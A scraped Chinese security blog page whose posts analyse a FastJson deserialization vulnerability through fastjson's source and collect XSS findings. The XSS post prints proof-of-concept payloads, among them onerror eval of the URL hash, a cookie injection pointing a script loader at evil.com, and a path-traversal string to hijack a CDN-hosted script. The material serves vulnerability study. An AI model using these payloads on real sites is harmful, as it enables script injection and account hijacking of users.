href="http://www.cnblogs.com/davidwang456/p/4446796.html">http://www.cnblogs.com/davidwang456/p/4446796.html<i class="fas fa-external-link-alt"></i></a><br><a class="link" target="_blank" rel="noopener" href="https://segmentfault.com/a/1190000006617344">https://segmentfault.com/a/1190000006617344<i class="fas fa-external-link-alt"></i></a><br><a class="link" target="_blank" rel="noopener" href="https://cert.360.cn/warning/detail?id=3efa573a1116c8e6eed3b47f78723f12">https://cert.360.cn/warning/detail?id=3efa573a1116c8e6eed3b47f78723f12<i class="fas fa-external-link-alt"></i></a></p>

                </div>

                <div class="home-article-meta-info-container">
    <div class="home-article-meta-info">
        <span><i class="fas fa-history"></i>&nbsp;<span class="home-article-date" data-date="Sun Apr 08 2018 21:00:00 GMT+0800">2018-04-08</span></span>
        
            <span class="home-article-category"><i class="fas fa-folder"></i>&nbsp;
                <ul>
                    
                        <li>
                            
                            <a href="/categories/JAVA%E5%AE%89%E5%85%A8/">JAVA安全</a>&nbsp;
                        </li>
                    
                    
                </ul>
            </span>
        
        
            <span class="home-article-tag">
                <i class="fas fa-tags"></i>&nbsp;
                <ul>
                    
                        <li>
                            
                            <a href="/tags/JAVA/">JAVA</a>&nbsp;
                        </li>
                    
                </ul>
            </span>
        
    </div>

    <a href="/CVE-2018-1270%20Remote%20Code%20Execution%20with%20spring-messaging/">Read more&nbsp;<i class="fas fa-angle-right"></i></a>
</div>

            </li>
        
            <li class="home-article-item">

                

                <h3 class="home-article-title">
                    <a href="/%E5%86%8D%E7%9C%8BFastJson%20Unserialization%E6%BC%8F%E6%B4%9E/">
                        再看FastJson Unserialization漏洞
                    </a>
                </h3>

                <!-- <div class="home-article-content markdown-body">
                    
                        0x01前言 这段时间反思了下，以前分析的那些框架级别漏洞，跟进一遍后就没有然后了，对漏洞的理解还是太浅，达不到举一反三的作用，再看一次fastjson
0x02 跟进调用链
JSON.parseObject

JSON是一个抽象类，JSON中有一个静态方法parseObject（String text），将text解析为一个JSONObject对象并返回

fastjson支持注册ObjectDeserializer实现自定义反序列化。要自定义序列化，首先需要实现一个ObjectDeserializer，然后注册到ParserConfig中



key是@type并启用了SpecialKeyDetect
把com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl加载为类
看一下getDeserializer的实现

过一遍denyList

还有一些常见内置类

均没有过滤之后通过createJavaBeanDeserializer来处理反序列化

createJavaBeanDeserializer方法后边需要经过JavaBeanInfo.build的处理

跟踪build方法

会遍历传入类的方法、字段等，需要满足下边的条件才会被添加到fieldList中
以set举例，还会以类似的规则处理get、field
12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182        for (Method method : methods) &#123; //            int ordinal = 0, serialzeFeatures = 0, parserFeatures = 0;            String methodName = method.getName();            if (methodName.length() &lt; 4) &#123;            //方法名长度大于4                continue;            &#125;            if (Modifier.isStatic(method.getModifiers())) &#123;            //是静态方法                continue;            &#125;            // support builder set            if (!(method.getReturnType().equals(Void.TYPE) || method.getReturnType().equals(method.getDeclaringClass()))) &#123;            //返回类型需要是void类型或者是当前类型                continue;            &#125;            Class&lt;?&gt;[] types = method.getParameterTypes();            if (types.length != 1) &#123;            //参数只能有一个                continue;            &#125;            JSONField annotation = method.getAnnotation(JSONField.class);            if (annotation == null) &#123;                annotation = TypeUtils.getSuperMethodAnnotation(clazz, method);            &#125;            if (annotation != null) &#123;                if (!annotation.deserialize()) &#123;                    continue;                &#125;                ordinal = annotation.ordinal();                serialzeFeatures = SerializerFeature.of(annotation.serialzeFeatures());                parserFeatures = Feature.of(annotation.parseFeatures());                if (annotation.name().length() != 0) &#123;                    String propertyName = annotation.name();                    add(fieldList, new FieldInfo(propertyName, method, null, clazz, type, ordinal, serialzeFeatures, parserFeatures,                                                  annotation, null, null));                    continue;                &#125;            &#125;            if (!methodName.startsWith(&quot;set&quot;)) &#123;             //以set开头            // TODO &quot;set&quot;的判断放在 JSONField 注解后面，意思是允许非 setter 方法标记 JSONField 注解？                continue;            &#125;            char c3 = methodName.charAt(3);            String propertyName;            if (Character.isUpperCase(c3) //                || c3 &gt; 512 // for unicode method name            ) &#123;                if (TypeUtils.compatibleWithJavaBean) &#123;                    propertyName = TypeUtils.decapitalize(methodName.substring(3));                &#125; else &#123;                    propertyName = Character.toLowerCase(methodName.charAt(3)) + methodName.substring(4);                &#125;            &#125; else if (c3 == &#x27;_&#x27;) &#123;                propertyName = methodName.substring(4);                //取_后字符做变量名，即第4个往后            &#125; else if (c3 == &#x27;f&#x27;) &#123;                propertyName = methodName.substring(3);                //set往后，即第3个往后            &#125; else if (methodName.length() &gt;= 5 &amp;&amp; Character.isUpperCase(methodName.charAt(4))) &#123;            //长度大于5并且第5个字母大写                propertyName = TypeUtils.decapitalize(methodName.substring(3));                //取set后边字符并转为小写            &#125; else &#123;                continue;            &#125;.......            add(fieldList, new FieldInfo(propertyName, method, field, clazz, type, ordinal, serialzeFeatures, parserFeatures,                                         annotation, fieldAnnotation, null));        &#125;



上边跟踪了下getDeserializer的实现

接下来就是deserialze了

遍历javabeaninfo中处理返回的fieldList

遍历的过程会对相应的field进行getDeserializer处理然后通过parseField进行反序列化

跟进parseField看一下实现，它的作用应该就是实现“定制序列化”这个特性


parseField里调用了smartMatch方法，这个漏洞很关键的一个点这也就是遍历到_outputProperties时执行getOutputProperties()的症结所在

可以看到parseField调用了setValue

跟进一下setValue可以看到method就是getOutputProperties()既然是这样，那么很明显的是要利用getOutputProperties()来执行恶意代码
关于getOutputProperties()的执行链可以看上一篇分析https://blog.langu.xyz/%20FastJsonUnserialization.html


0x03 构造POC和执行的根本原因上一篇基本已经提及了https://blog.langu.xyz/%20FastJsonUnserialization.html
很精妙的一个漏洞，环环相扣
这个gadget更是各种巧合，只要有任意一个点限制，就不能利用成功
若json字符串中包含@type字段，会按照@type指定的类进行反序列化
在修复版本中会默认忽略该字段，若数据中有@type字段，会抛出autoType is not support错误
同时修复版本中允许通过配置白名单的形式来提供对特定类反序列化的支持
1、调用链
    1、为什么会走到这一步
    2、关键方法是什么
    3、特性是什么
    4、继承自哪里

2、最后是如何执行的
    1、根本原因/本质是什么
    
3、如果是自己，该怎么挖出这个漏洞

4、再构造一次poc
    1、构造要点
    2、所需条件

参考：https://github.com/alibaba/fastjson/wiki/http://xxlegend.com/2017/04/29/title-%20fastjson%20%E8%BF%9C%E7%A8%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96poc%E7%9A%84%E6%9E%84%E9%80%A0%E5%92%8C%E5%88%86%E6%9E%90/https://ricterz.me/posts/Fastjson%20Unserialize%20Vulnerability%20Write%20Uphttp://5alt.me/2017/09/fastjson%E8%B0%83%E8%AF%95%E5%88%A9%E7%94%A8%E8%AE%B0%E5%BD%95/

                    
                </div> -->
                <div class="article-content markdown-body">
                    <h4 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h4><p>前言 这段时间反思了下，以前分析的那些框架级别漏洞，跟进一遍后就没有然后了，对漏洞的理解还是太浅，达不到举一反三的作用，再看一次fastjson</p>
<h4 id="0x02-跟进调用链"><a href="#0x02-跟进调用链" class="headerlink" title="0x02 跟进调用链"></a>0x02 跟进调用链</h4><p><img lazyload src="/images/loading.svg" data-src="15217923998433.jpg"></p>
<p>JSON.parseObject</p>
<p><img lazyload src="/images/loading.svg" data-src="15217925423751.jpg"><br><img lazyload src="/images/loading.svg" data-src="15217930007239.jpg"></p>
<p>JSON是一个抽象类，JSON中有一个静态方法parseObject（String text），将text解析为一个JSONObject对象并返回</p>
<p><img lazyload src="/images/loading.svg" data-src="15217932644440.jpg"></p>
<p>fastjson支持注册ObjectDeserializer实现自定义反序列化。要自定义序列化，首先需要实现一个ObjectDeserializer，然后注册到ParserConfig中</p>
<p><img lazyload src="/images/loading.svg" data-src="15217967095189.jpg"></p>
<p><img lazyload src="/images/loading.svg" data-src="15217969833221.jpg"></p>
<p><img lazyload src="/images/loading.svg" data-src="15218010473832.jpg"></p>
<p>key是@type并启用了SpecialKeyDetect</p>
<p>把com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl加载为类</p>
<p>看一下getDeserializer的实现</p>
<p><img lazyload src="/images/loading.svg" data-src="15218017480400.jpg"></p>
<p>过一遍denyList</p>
<p><img lazyload src="/images/loading.svg" data-src="15218019424700.jpg"></p>
<p>还有一些常见内置类</p>
<p><img lazyload src="/images/loading.svg" data-src="15218020062741.jpg"></p>
<p>均没有过滤之后通过createJavaBeanDeserializer来处理反序列化</p>
<p><img lazyload src="/images/loading.svg" data-src="15218018652602.jpg"></p>
<p>createJavaBeanDeserializer方法后边需要经过JavaBeanInfo.build的处理</p>
<p><img lazyload src="/images/loading.svg" data-src="15218023262410.jpg"></p>
<p>跟踪build方法</p>
<p><img lazyload src="/images/loading.svg" data-src="15218027829262.jpg"></p>
<p>会遍历传入类的方法、字段等，需要满足下边的条件才会被添加到fieldList中</p>
<p>以set举例，还会以类似的规则处理get、field</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line">        for (Method method : methods) &#123; //</span><br><span class="line">            int ordinal = 0, serialzeFeatures = 0, parserFeatures = 0;</span><br><span class="line">            String methodName = method.getName();</span><br><span class="line">            if (methodName.length() &lt; 4) &#123;</span><br><span class="line">            //方法名长度大于4</span><br><span class="line">                continue;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            if (Modifier.isStatic(method.getModifiers())) &#123;</span><br><span class="line">            //是静态方法</span><br><span class="line">                continue;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            // support builder set</span><br><span class="line">            if (!(method.getReturnType().equals(Void.TYPE) || method.getReturnType().equals(method.getDeclaringClass()))) &#123;</span><br><span class="line">            //返回类型需要是void类型或者是当前类型</span><br><span class="line">                continue;</span><br><span class="line">            &#125;</span><br><span class="line">            Class&lt;?&gt;[] types = method.getParameterTypes();</span><br><span class="line">            if (types.length != 1) &#123;</span><br><span class="line">            //参数只能有一个</span><br><span class="line">                continue;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            JSONField annotation = method.getAnnotation(JSONField.class);</span><br><span class="line"></span><br><span class="line">            if (annotation == null) &#123;</span><br><span class="line">                annotation = TypeUtils.getSuperMethodAnnotation(clazz, method);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            if (annotation != null) &#123;</span><br><span class="line">                if (!annotation.deserialize()) &#123;</span><br><span class="line">                    continue;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                ordinal = annotation.ordinal();</span><br><span class="line">                serialzeFeatures = SerializerFeature.of(annotation.serialzeFeatures());</span><br><span class="line">                parserFeatures = Feature.of(annotation.parseFeatures());</span><br><span class="line"></span><br><span class="line">                if (annotation.name().length() != 0) &#123;</span><br><span class="line">                    String propertyName = annotation.name();</span><br><span class="line">                    add(fieldList, new FieldInfo(propertyName, method, null, clazz, type, ordinal, serialzeFeatures, parserFeatures, </span><br><span class="line">                                                 annotation, null, null));</span><br><span class="line">                    continue;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            if (!methodName.startsWith(&quot;set&quot;)) &#123; </span><br><span class="line">            //以set开头</span><br><span class="line">            // TODO &quot;set&quot;的判断放在 JSONField 注解后面，意思是允许非 setter 方法标记 JSONField 注解？</span><br><span class="line">                continue;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            char c3 = methodName.charAt(3);</span><br><span class="line"></span><br><span class="line">            String propertyName;</span><br><span class="line">            if (Character.isUpperCase(c3) //</span><br><span class="line">                || c3 &gt; 512 // for unicode method name</span><br><span class="line">            ) &#123;</span><br><span class="line">                if (TypeUtils.compatibleWithJavaBean) &#123;</span><br><span class="line">                    propertyName = TypeUtils.decapitalize(methodName.substring(3));</span><br><span class="line">                &#125; else &#123;</span><br><span class="line">                    propertyName = Character.toLowerCase(methodName.charAt(3)) + methodName.substring(4);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; else if (c3 == &#x27;_&#x27;) &#123;</span><br><span class="line">                propertyName = methodName.substring(4);</span><br><span class="line">                //取_后字符做变量名，即第4个往后</span><br><span class="line">            &#125; else if (c3 == &#x27;f&#x27;) &#123;</span><br><span class="line">                propertyName = methodName.substring(3);</span><br><span class="line">                //set往后，即第3个往后</span><br><span class="line">            &#125; else if (methodName.length() &gt;= 5 &amp;&amp; Character.isUpperCase(methodName.charAt(4))) &#123;</span><br><span class="line">            //长度大于5并且第5个字母大写</span><br><span class="line">                propertyName = TypeUtils.decapitalize(methodName.substring(3));</span><br><span class="line">                //取set后边字符并转为小写</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                continue;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">.......</span><br><span class="line">            add(fieldList, new FieldInfo(propertyName, method, field, clazz, type, ordinal, serialzeFeatures, parserFeatures,</span><br><span class="line">                                         annotation, fieldAnnotation, null));</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>



<p>上边跟踪了下getDeserializer的实现</p>
<p><img lazyload src="/images/loading.svg" data-src="15219045005865.jpg"></p>
<p>接下来就是deserialze了</p>
<p><img lazyload src="/images/loading.svg" data-src="15219046577386.jpg"></p>
<p>遍历javabeaninfo中处理返回的fieldList</p>
<p><img lazyload src="/images/loading.svg" data-src="15219047427363.jpg"></p>
<p>遍历的过程会对相应的field进行getDeserializer处理<br>然后通过parseField进行反序列化</p>
<p><img lazyload src="/images/loading.svg" data-src="15219050465669.jpg"></p>
<p>跟进parseField看一下实现，它的作用应该就是实现“定制序列化”这个特性</p>
<p><img lazyload src="/images/loading.svg" data-src="15219051518103.jpg"></p>
<p><img lazyload src="/images/loading.svg" data-src="15219054677413.jpg"></p>
<p>parseField里调用了smartMatch方法，这个漏洞很关键的一个点<br>这也就是遍历到_outputProperties时执行getOutputProperties()的症结所在</p>
<p><img lazyload src="/images/loading.svg" data-src="15219056214849.jpg"></p>
<p>可以看到parseField调用了setValue</p>
<p><img lazyload src="/images/loading.svg" data-src="15219060189459.jpg"></p>
<p>跟进一下setValue可以看到method就是getOutputProperties()<br>既然是这样，那么很明显的是要利用getOutputProperties()来执行恶意代码</p>
<p>关于getOutputProperties()的执行链可以看上一篇分析<a href="https://blog.langu.xyz/%20FastJsonUnserialization.html">https://blog.langu.xyz/%20FastJsonUnserialization.html</a></p>
<p><img lazyload src="/images/loading.svg" data-src="15219064681028.jpg"></p>
<p><img lazyload src="/images/loading.svg" data-src="15219063930004.jpg"></p>
<h4 id="0x03-构造POC和执行的根本原因"><a href="#0x03-构造POC和执行的根本原因" class="headerlink" title="0x03 构造POC和执行的根本原因"></a>0x03 构造POC和执行的根本原因</h4><p>上一篇基本已经提及了<a href="https://blog.langu.xyz/%20FastJsonUnserialization.html">https://blog.langu.xyz/%20FastJsonUnserialization.html</a></p>
<p>很精妙的一个漏洞，环环相扣</p>
<p>这个gadget更是各种巧合，只要有任意一个点限制，就不能利用成功</p>
<p>若json字符串中包含@type字段，会按照@type指定的类进行反序列化</p>
<p>在修复版本中会默认忽略该字段，若数据中有@type字段，会抛出autoType is not support错误</p>
<p>同时修复版本中允许通过配置白名单的形式来提供对特定类反序列化的支持</p>
<pre><code>1、调用链
    1、为什么会走到这一步
    2、关键方法是什么
    3、特性是什么
    4、继承自哪里

2、最后是如何执行的
    1、根本原因/本质是什么
    
3、如果是自己，该怎么挖出这个漏洞

4、再构造一次poc
    1、构造要点
    2、所需条件
</code></pre>
<p>参考：<br><a class="link" target="_blank" rel="noopener" href="https://github.com/alibaba/fastjson/wiki/">https://github.com/alibaba/fastjson/wiki/<i class="fas fa-external-link-alt"></i></a><br><a class="link" target="_blank" rel="noopener" href="http://xxlegend.com/2017/04/29/title-%20fastjson%20%E8%BF%9C%E7%A8%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96poc%E7%9A%84%E6%9E%84%E9%80%A0%E5%92%8C%E5%88%86%E6%9E%90/">http://xxlegend.com/2017/04/29/title-%20fastjson%20%E8%BF%9C%E7%A8%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96poc%E7%9A%84%E6%9E%84%E9%80%A0%E5%92%8C%E5%88%86%E6%9E%90/<i class="fas fa-external-link-alt"></i></a><br><a class="link" target="_blank" rel="noopener" href="https://ricterz.me/posts/Fastjson%20Unserialize%20Vulnerability%20Write%20Up">https://ricterz.me/posts/Fastjson%20Unserialize%20Vulnerability%20Write%20Up<i class="fas fa-external-link-alt"></i></a><br><a class="link" target="_blank" rel="noopener" href="http://5alt.me/2017/09/fastjson%E8%B0%83%E8%AF%95%E5%88%A9%E7%94%A8%E8%AE%B0%E5%BD%95/">http://5alt.me/2017/09/fastjson%E8%B0%83%E8%AF%95%E5%88%A9%E7%94%A8%E8%AE%B0%E5%BD%95/<i class="fas fa-external-link-alt"></i></a></p>

                </div>

                <div class="home-article-meta-info-container">
    <div class="home-article-meta-info">
        <span><i class="fas fa-history"></i>&nbsp;<span class="home-article-date" data-date="Fri Mar 23 2018 21:00:00 GMT+0800">2018-03-23</span></span>
        
            <span class="home-article-category"><i class="fas fa-folder"></i>&nbsp;
                <ul>
                    
                        <li>
                            
                            <a href="/categories/JAVA%E5%AE%89%E5%85%A8/">JAVA安全</a>&nbsp;
                        </li>
                    
                    
                </ul>
            </span>
        
        
            <span class="home-article-tag">
                <i class="fas fa-tags"></i>&nbsp;
                <ul>
                    
                        <li>
                            
                            <a href="/tags/JAVA/">JAVA</a>&nbsp;
                        </li>
                    
                </ul>
            </span>
        
    </div>

    <a href="/%E5%86%8D%E7%9C%8BFastJson%20Unserialization%E6%BC%8F%E6%B4%9E/">Read more&nbsp;<i class="fas fa-angle-right"></i></a>
</div>

            </li>
        
            <li class="home-article-item">

                

                <h3 class="home-article-title">
                    <a href="/JavaScript%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/">
                        JavaScript源码分析漏洞挖掘
                    </a>
                </h3>

                <!-- <div class="home-article-content markdown-body">
                    
                        1. script标签的src触发xsscode：
12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152    &lt;script&gt;    function setInnerText(element, value) &#123;      if (element.innerText) &#123;        element.innerText = value;      &#125; else &#123;        element.textContent = value;      &#125;    &#125;    function includeGadget(url) &#123;      var scriptEl = document.createElement(&#x27;script&#x27;);      // This will totally prevent us from loading evil URLs!      if (url.match(/^https?:\/\//)) &#123;        //通过大小写等绕过正则检测        setInnerText(document.getElementById(&quot;log&quot;),          &quot;Sorry, cannot load a URL containing \&quot;http\&quot;.&quot;);        return;      &#125;      // Load this awesome gadget      scriptEl.src = url;      // Show log messages      scriptEl.onload = function() &#123;         setInnerText(document.getElementById(&quot;log&quot;),            &quot;Loaded gadget from &quot; + url);      &#125;      scriptEl.onerror = function() &#123;         setInnerText(document.getElementById(&quot;log&quot;),            &quot;Couldn&#x27;t load gadget from &quot; + url);      &#125;      document.head.appendChild(scriptEl);      //&lt;script src=&quot;data:text/javascript,alert(&#x27;1&#x27;)&quot;&gt;&lt;/script&gt;    &#125;    // Take the value after # and use it as the gadget filename.    function getGadgetName() &#123;     //获取或设置页面的标签值并进行跳转      return window.location.hash.substr(1) || &quot;/static/gadget.js&quot;;      //data:text/javascript,alert(&#x27;1&#x27;)    &#125;    includeGadget(getGadgetName());    // Extra code so that we can communicate with the parent page    window.addEventListener(&quot;message&quot;, function(event)&#123;      if (event.source == parent) &#123;        includeGadget(getGadgetName());      &#125;    &#125;, false);    &lt;/script&gt;  &lt;/head&gt;  &lt;body id=&quot;level6&quot;&gt;    &lt;img src=&quot;/static/logos/level6.png&quot;&gt;    &lt;img id=&quot;cube&quot; src=&quot;/static/level6_cube.png&quot;&gt;    &lt;div id=&quot;log&quot;&gt;Loading gadget...&lt;/div&gt;  &lt;/body&gt;&lt;/html&gt;

POC:
1、data:text/javascript,alert(&#39;1&#39;)2、Https://google.com/jsapi?callback=alert(1)
思考：待分析
2.正则匹配资源文件导致XSScode：
12345678910111213141516(function() &#123;    var k = document.createElement(&#x27;script&#x27;);  // 创建script标签    k.type = &#x27;text/javascript&#x27;;    k.async = true;    k.setAttribute(&quot;data-id&quot;, u.pubid);    k.className = &quot;kxct&quot;;    k.setAttribute(&quot;data-version&quot;, &quot;1.9&quot;);    // 从location.href参数中读取kxsrc    var m, src = (m = location.href.match(/\bkxsrc=([^&amp;]+)/)) &amp;&amp; decodeURIComponent(m[1]);    // 检查kxsrc参数的值是否满足正则，如果满足则加载，否则加载默认的JS文件     k.src = /^https?:\/\/([a-z0-9-.]+.)?krxd.net(:\d&#123;1,5&#125;)?\/controltag\//i.test(src) ? src : src === &quot;disable&quot; ? &quot;&quot; : (location.protocol === &quot;https:&quot; ? &quot;https:&quot; : &quot;http:&quot;) + &quot;//cdn.krxd.net/controltag?confid=&quot; + u.pubid;    var s = document.getElementsByTagName(&#x27;script&#x27;)[0];    s.parentNode.insertBefore(k, s);&#125;)();

POC：
1/^https?:\/\/([a-z0-9-.]+.)?krxd.net(:\d&#123;1,5&#125;)?\/controltag\//i.test(&#x27;https://a.bkrxd.net/controltag/evil.js&#x27;)

FIXED：
1/^https?:\/\/([a-z0-9-\.]+\.)?krxd\.net(:\d&#123;1,5&#125;)?\/controltag\//i.test(&#x27;https://krxd.net/controltag/evil.js&#x27;)

思考：
遇到用户可控的输入，尝试绕过正则
3.反射xss + cookie xss 攻击链code：
12345678idrCall: function() &#123;    var a, b;    return this.idrCallPending ? void 0 : (this.log(&quot;making idr call&quot;),    a = this.rfiServer ? this.rfiServer : &quot;a.rfihub.com&quot;,    b = this.getProtocol() + &quot;//&quot; + a + &quot;/idr.js&quot;,    this.jsonpGet(b, &#123;&#125;, this.idrCallback, &quot;cmZpSWRJbkNhY2hl&quot;),    this.idrCallPending = !0)&#125;,

12a = this.readCookie(&quot;_rfiServer&quot;),null != a &amp;&amp; this.setRfiServer(a),

POC:
1、CLRF注入2、subdomain xss 写入cookie
123https://&lt;redacted&gt;.test.com/&lt;redacted&gt;?email=aaa&quot;%20type%3d&quot;image&quot;%20src%3d1%20o&gt;nerror%3d&quot;eval(decodeURIComponent(location.hash.substr(1)))#document.cookie=&#x27;_rfiServer=evil.com;domain=.uber.com;expires=Sat, 27 Jan 2999 01:43:57 GMT;path=/&#x27;;location.href=&quot;https://get.test.com&quot;;

Tips:
1、如果输出在标签内且没有过滤”，可使用类似payloadtype=&quot;image&quot; src=&quot;1&quot; onerror=&quot;alert(1)&quot;2、过滤&lt;&gt;时，正好可以利用其绕过xss auditor，oner&lt;ror
思考：
首先观察是否是动态生成的，如果是，观察是否直接可控，如果否，思考如果构造攻击链间接控制
Hijack the JS File of the third part CDNcode：
1https://tags.tiqcdn.com/utag/uber/main/prod/utag.js

POC：
1、第三方CDN，允许个人上传2、上传个人js观察路径/data/utui/data/accounts/evilaccount/templates/main/201804081230/utag.js和目标路径/data/utui/data/accounts/uber/templates/main/utag.js3、寻找路径穿越漏洞，构造payload201804081230/../../../../&lt;victimaccount&gt;/templates/main4、/data/utui/data/accounts/evilaccount/templates/main/201804081230/../../../../&lt;victimaccount&gt;/templates/main/utag.js == /data/utui/data/accounts/&lt;victimaccount&gt;/templates/main/utag.js
思路：
遇到使用第三方的资源，思考下能不能控制它
事件接受参数时控制事件触发xsscode：
123456789101112131415161718192021222324&lt;!doctype html&gt;&lt;html&gt;  &lt;head&gt;    &lt;!-- Internal game scripts/styles, mostly boring stuff --&gt;    &lt;script src=&quot;/static/game-frame.js&quot;&gt;&lt;/script&gt;    &lt;link rel=&quot;stylesheet&quot; href=&quot;/static/game-frame-styles.css&quot; /&gt;    &lt;script&gt;      function startTimer(seconds) &#123;        seconds = parseInt(seconds) || 3;        setTimeout(function() &#123;           window.confirm(&quot;Time is up!&quot;);          window.history.back();        &#125;, seconds * 1000);      &#125;    &lt;/script&gt;  &lt;/head&gt;  &lt;body id=&quot;level4&quot;&gt;    &lt;img src=&quot;/static/logos/level4.png&quot; /&gt;    &lt;br&gt;    &lt;img src=&quot;/static/loading.gif&quot; onload=&quot;startTimer(&#x27;&#123;&#123; timer &#125;&#125;&#x27;);&quot; /&gt;    &lt;br&gt;    &lt;div id=&quot;message&quot;&gt;Your timer will execute in &#123;&#123; timer &#125;&#125; seconds.&lt;/div&gt;  &lt;/body&gt;&lt;/html&gt;

POC:
1、&#39;);alert(&#39;1
2、&lt;img src=&quot;/static/loading.gif&quot; onload=&quot;startTimer(&#39;&#123;&#123; ');alert('1 &#125;&#125;&#39;);&quot; /&gt;
思路：
观察可控点的位置，如果为tag中，尝试bypass，优先解析value
 href tag xsscode：
123456789101112131415&lt;!doctype html&gt;&lt;html&gt;  &lt;head&gt;    &lt;!-- Internal game scripts/styles, mostly boring stuff --&gt;    &lt;script src=&quot;/static/game-frame.js&quot;&gt;&lt;/script&gt;    &lt;link rel=&quot;stylesheet&quot; href=&quot;/static/game-frame-styles.css&quot; /&gt;  &lt;/head&gt;  &lt;body id=&quot;level5&quot;&gt;    &lt;img src=&quot;/static/logos/level5.png&quot; /&gt;&lt;br&gt;&lt;br&gt;    &lt;!-- We&#x27;re ignoring the email, but the poor user will never know! --&gt;    Enter email: &lt;input id=&quot;reader-email&quot; name=&quot;email&quot; value=&quot;&quot;&gt;    &lt;br&gt;&lt;br&gt;    &lt;a href=&quot;&#123;&#123; next &#125;&#125;&quot;&gt;Next &gt;&gt;&lt;/a&gt;  &lt;/body&gt;&lt;/html&gt;

POC:
1、javascript:alert(1)2、&lt;a href=&quot;javascript:alert(1)&quot;&gt;Next &gt;&gt;&lt;/a&gt;
思考：
积累javascript:alert(1)知识点,可控的地方一定有xss
URL拼接导致的dom xsscode：
123456789101112131415161718192021//Checking for potential Lever source or origin parametersvar pageUrl = window.location.href;var leverParameter = &#x27;&#x27;;var trackingPrefix = &#x27;?lever-&#x27;if( pageUrl.indexOf(trackingPrefix) &gt;= 0)&#123;  // Found Lever parameter  var pageUrlSplit = pageUrl.split(trackingPrefix);  leverParameter = &#x27;?lever-&#x27;+pageUrlSplit[1];&#125; var link = posting.hostedUrl+leverParameter;        jQuery(&#x27;#jobs-container .jobs-list&#x27;).append(      &#x27;&lt;div class=&quot;job &#x27;+teamCleanString+&#x27; &#x27;+locationCleanString.replace(&#x27;,&#x27;, &#x27;&#x27;)+&#x27; &#x27;+commitmentCleanString+&#x27;&quot;&gt;&#x27; +        &#x27;&lt;a class=&quot;job-title&quot; href=&quot;&#x27;+link+&#x27;&quot;&quot;&gt;&#x27;+title+&#x27;&lt;/a&gt;&#x27; +        &#x27;&lt;p class=&quot;tags&quot;&gt;&lt;span&gt;&#x27;+team+&#x27;&lt;/span&gt;&lt;span&gt;&#x27;+location+&#x27;&lt;/span&gt;&lt;span&gt;&#x27;+commitment+&#x27;&lt;/span&gt;&lt;/p&gt;&#x27; +        &#x27;&lt;p class=&quot;description&quot;&gt;&#x27;+shortDescription+&#x27;&lt;/p&gt;&#x27; +        &#x27;&lt;a class=&quot;btn&quot; href=&quot;&#x27;+link+&#x27;&quot;&gt;Learn more&lt;/a&gt;&#x27; +      &#x27;&lt;/div&gt;&#x27;        );

POC:1、https://www.test.com/careers?lever-#aaa&quot;&gt;&lt;script src=&quot;data:text/javascript,alert(&#39;1&#39;)&quot;&gt;&lt;/script&gt;

                    
                </div> -->
                <div class="article-content markdown-body">
                    <h2 id="1-script标签的src触发xss"><a href="#1-script标签的src触发xss" class="headerlink" title="1. script标签的src触发xss"></a>1. script标签的src触发xss</h2><p>code：</p>
